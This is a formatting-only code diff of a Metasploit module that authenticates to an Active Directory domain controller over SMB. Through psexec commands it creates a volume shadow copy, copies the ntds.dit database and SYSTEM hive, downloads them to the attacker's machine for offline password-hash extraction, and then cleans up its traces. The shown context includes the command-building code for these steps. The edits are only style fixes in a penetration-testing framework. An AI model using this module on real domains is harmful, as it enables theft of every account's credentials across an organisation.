@@ -11,30 +11,32 @@ class MetasploitModule < Msf::Auxiliary
 
   # Aliases for common classes
   SIMPLE = Rex::Proto::SMB::SimpleClient
-  XCEPT= Rex::Proto::SMB::Exceptions
-  CONST= Rex::Proto::SMB::Constants
-
+  XCEPT = Rex::Proto::SMB::Exceptions
+  CONST = Rex::Proto::SMB::Constants
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'PsExec NTDS.dit And SYSTEM Hive Download Utility',
-      'Description'=> %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'PsExec NTDS.dit And SYSTEM Hive Download Utility',
+        'Description' => %q{
           This module authenticates to an Active Directory Domain Controller and creates
-        a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the
-        ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM
-        hive copy can be used in combination with other tools for offline extraction of AD
-        password hashes. All of this is done without uploading a single binary to the
-        target host.
-      },
-      'Author' => [
-        'Royce Davis <rdavis[at]accuvant.com>' # @R3dy__
-      ],
-      'License'=> MSF_LICENSE,
-      'References' => [
-        [ 'URL', 'http://sourceforge.net/projects/smbexec' ],
-        [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ]
-      ]
-    ))
+          a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the
+          ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM
+          hive copy can be used in combination with other tools for offline extraction of AD
+          password hashes. All of this is done without uploading a single binary to the
+          target host.
+        },
+        'Author' => [
+          'Royce Davis <rdavis[at]accuvant.com>' # @R3dy__
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'URL', 'http://sourceforge.net/projects/smbexec' ],
+          [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ]
+        ]
+      )
+    )
 
     register_options([
       OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
@@ -42,7 +44,6 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
       OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', false]),
     ])
-
   end
 
   # This is the main control method
@@ -87,7 +88,6 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   # Thids method will check if a Volume Shadow Copy already exists and use that rather
   # then creating a new one
   def check_vss(text, bat)
@@ -112,15 +112,14 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   # Create a Volume Shadow Copy on the target host
   def make_volume_shadow_copy(createvsc, text, bat)
     begin
-      #Try to create the shadow copy
+      # Try to create the shadow copy
       command = "%COMSPEC% /C echo #{createvsc} ^> #{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
       print_status("Creating Volume Shadow Copy")
       out = psexec(command)
-      #Get path to Volume Shadow Copy
+      # Get path to Volume Shadow Copy
       vscpath = get_vscpath(text)
     rescue StandardError => vscerror
       print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
@@ -134,7 +133,6 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   # Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
   def copy_ntds(vscpath, text)
     begin
@@ -144,13 +142,13 @@ class MetasploitModule < Msf::Auxiliary
       if !check_ntds(text)
         return false
       end
+
       return true
     rescue StandardError => ntdscopyerror
       print_error("Unable to copy ntds.dit from Volume Shadow Copy.Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
       return false
     end
   end
-
 
   # Checks if ntds.dit was copied to the Windows Temp directory
   def check_ntds(text)
@@ -161,9 +159,9 @@ class MetasploitModule < Msf::Auxiliary
     if output.include?("ntds")
       return true
     end
+
     return false
   end
-
 
   # Copies the SYSTEM hive file to the Temp directory on the target host
   def copy_sys_hive
@@ -176,7 +174,6 @@ class MetasploitModule < Msf::Auxiliary
       return false
     end
   end
-
 
   # Download the ntds.dit copy to your attacking machine
   def download_ntds(file)
@@ -196,7 +193,6 @@ class MetasploitModule < Msf::Auxiliary
     simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
   end
 
-
   # Download the SYSTEM hive copy to your attacking machine
   def download_sys_hive(file)
     print_status("Downloading SYSTEM hive file")
@@ -214,7 +210,6 @@ class MetasploitModule < Msf::Auxiliary
     end
     simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
   end
-
 
   # Gets the path to the Volume Shadow Copy
   def get_vscpath(file)
@@ -245,7 +240,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Unable to cleanup #{file}. Error: #{cleanuperror}")
       end
     end
-    left = files.collect{ |f| smb_file_exist?(f) }
+    left = files.collect { |f| smb_file_exist?(f) }
     if left.any?
       print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
     else
